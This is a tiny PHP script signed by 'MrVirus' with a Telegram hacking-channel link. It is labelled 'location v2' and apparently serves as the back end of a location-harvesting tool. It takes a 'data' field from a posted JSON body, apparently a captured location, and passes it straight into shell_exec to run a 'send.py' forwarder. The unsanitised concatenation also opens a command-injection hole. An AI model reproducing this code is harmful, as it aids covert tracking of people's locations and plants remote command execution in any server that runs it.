//code by MrVirus
//location v2
//t.me/NulHaCk
<?php
$json = (file_get_contents('php://input'));
$dejson = json_decode($json, true);
$location = $dejson['data'];
shell_exec("python3 send.py ".$location);
?>
